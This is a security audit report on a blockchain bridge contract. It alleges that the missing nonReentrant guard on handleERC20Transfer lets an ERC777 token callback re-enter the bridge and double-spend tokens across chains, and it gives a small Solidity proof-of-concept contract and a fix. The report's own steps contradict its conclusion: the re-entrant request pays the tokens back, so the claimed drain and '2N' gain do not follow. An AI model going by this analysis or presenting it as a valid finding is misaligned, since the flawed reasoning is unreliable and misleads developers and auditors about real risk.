### Title
Missing `nonReentrant` on `handleERC20Transfer` Enables Cross-Chain Double-Spend via ERC777 Token Callback — (`contracts/service_chain/bridge/BridgeTransferERC20.sol`)

---

### Summary

`BridgeTransferERC20::handleERC20Transfer` lacks the `nonReentrant` modifier that its sibling `BridgeTransferKLAY::handleKLAYTransfer` carries. The function performs all nonce/vote state updates before making an external `safeTransfer` call to the token contract. When the registered token is ERC777-compatible (which calls `tokensReceived` on the recipient), a malicious recipient contract can re-enter the bridge during that callback, emit a spurious `RequestValueTransfer` event, and cause the counterpart chain's bridge to release tokens it should not release — effectively draining the source-chain bridge reserves.

---

### Finding Description

`handleKLAYTransfer` in `BridgeTransferKLAY.sol` is decorated with `nonReentrant`:

```solidity
function handleKLAYTransfer(...) public onlyOperators nonReentrant {
    ...
    (bool ok, ) = _to.call.value(_value)("");
    require(ok, "handleKLAYTransfer: transfer failed");
}
``` [1](#0-0) 

`handleERC20Transfer` in `BridgeTransferERC20.sol` is **not** decorated with `nonReentrant`:

```solidity
function handleERC20Transfer(...) public onlyOperators {
    _lowerHandleNonceCheck(_requestedNonce);
    if (!_voteValueTransfer(_requestedNonce)) { return; }
    _setHandledRequestTxHash(_requestTxHash);
    handleNoncesToBlockNums[_requestedNonce] = _requestedBlockNumber;
    _updateHandleNonce(_requestedNonce);
    emit HandleValueTransfer(...);
    // ← external call with no reentrancy guard
    if (modeMintBurn) {
        require(ERC20Mintable(_tokenAddress).mint(_to, _value), ...);
    } else {
        IERC20(_tokenAddress).safeTransfer(_to, _value);   // ← callback vector
    }
}
``` [2](#0-1) 

`BridgeTransferERC721::handleERC721Transfer` has the same omission: [3](#0-2) 

The `ReentrancyGuard` used by the bridge is the OpenZeppelin v2 counter-based guard: [4](#0-3) 

`BridgeTransferERC20` does **not** inherit `ReentrancyGuard` at all, while `BridgeTransferKLAY` does: [5](#0-4) [6](#0-5) 

The `requestERC20Transfer` and `onERC20Received` entry points are also unguarded: [7](#0-6) 

---

### Impact Explanation

**Attack chain (ERC777 token, `modeMintBurn = false`):**

1. Attacker deploys a malicious recipient contract `M` that implements `IERC777Recipient.tokensReceived`.
2. Attacker initiates a legitimate transfer on the source chain, locking `N` tokens, with `_to = M` on the destination chain.
3. The bridge operator relays the request and calls `handleERC20Transfer(..., _to=M, _value=N, ...)` on the destination chain bridge.
4. All nonce/vote state is written (`closedValueTransferVotes[nonce] = true`, `handleNoncesToBlockNums`, `lowerHandleNonce`).
5. `safeTransfer` calls `token.transfer(M, N)`. ERC777's `transfer` calls `M.tokensReceived(...)`.
6. Inside `tokensReceived`, `M` approves the destination bridge and calls `requestERC20Transfer(token, attackerAddr, N, 0, "")`.
7. The bridge pulls `N` tokens back from `M`, emits `RequestValueTransfer` with a fresh `requestNonce`, and increments `requestNonce`.
8. Source-chain operators observe the new `RequestValueTransfer` event on the destination chain and relay it to the source chain.
9. The source-chain bridge calls `handleERC20Transfer` for the spurious nonce, releasing `N` tokens to `attackerAddr`.

**Net result:** The attacker receives `N` tokens on the destination chain (step 5) and `N` tokens on the source chain (step 9), while the destination-chain bridge holds `N` tokens (step 6). The source-chain bridge has been drained of `N` tokens without a legitimate lock.

The corrupted value is `requestNonce` on the destination chain (incremented by a spurious request) and the source-chain bridge's ERC20 token balance (decremented without a corresponding lock).

---

### Likelihood Explanation

- ERC777 tokens are widely deployed (e.g., many DeFi tokens). Any ERC777 token registered on both bridge sides is sufficient.
- The `_to` address is user-controlled on the source chain; operators relay it without inspection.
- The malicious recipient contract requires no special privileges — any user can deploy it.
- The only precondition is that the bridge has registered an ERC777-compatible token, which is a normal operational state.

---

### Recommendation

1. Make `BridgeTransferERC20` inherit `ReentrancyGuard` and add `nonReentrant` to `handleERC20Transfer`, `requestERC20Transfer`, and `onERC20Received`, mirroring the pattern in `BridgeTransferKLAY`.
2. Apply the same fix to `handleERC721Transfer` in `BridgeTransferERC721` for defense-in-depth.
3. Follow the checks-effects-interactions pattern: all state writes already precede the external call, but the missing guard must be added to prevent re-entry through token callbacks.

```solidity
// BridgeTransferERC20 should inherit ReentrancyGuard
contract BridgeTransferERC20 is BridgeTokens, IERC20BridgeReceiver, BridgeTransfer, ReentrancyGuard {
    function handleERC20Transfer(...) public onlyOperators nonReentrant { ... }
    function requestERC20Transfer(...) public nonReentrant { ... }
    function onERC20Received(...) public nonReentrant { ... }
}
```

### Proof of Concept

```solidity
// Malicious recipient implementing IERC777Recipient
contract MaliciousRecipient is IERC777Recipient {
    IBridge bridge;
    IERC20 token;
    address attacker;

    function tokensReceived(
        address, address, address, uint256 amount,
        bytes calldata, bytes calldata
    ) external override {
        // Re-enter: send tokens back to bridge as a new request
        token.approve(address(bridge), amount);
        bridge.requestERC20Transfer(address(token), attacker, amount, 0, "");
    }
}

// Attack flow:
// 1. Deploy MaliciousRecipient M
// 2. On source chain: lock N tokens with _to = M
// 3. Operator calls handleERC20Transfer(..., _to=M, _value=N)
//    → ERC777 calls M.tokensReceived
//    → M calls bridge.requestERC20Transfer (no nonReentrant blocks this)
//    → New RequestValueTransfer emitted with fresh nonce
// 4. Source chain operators relay spurious request
// 5. Source chain bridge releases N tokens to attacker
// Result: attacker holds 2N tokens total; source bridge drained of N tokens
``` [8](#0-7) [9](#0-8) [10](#0-9)
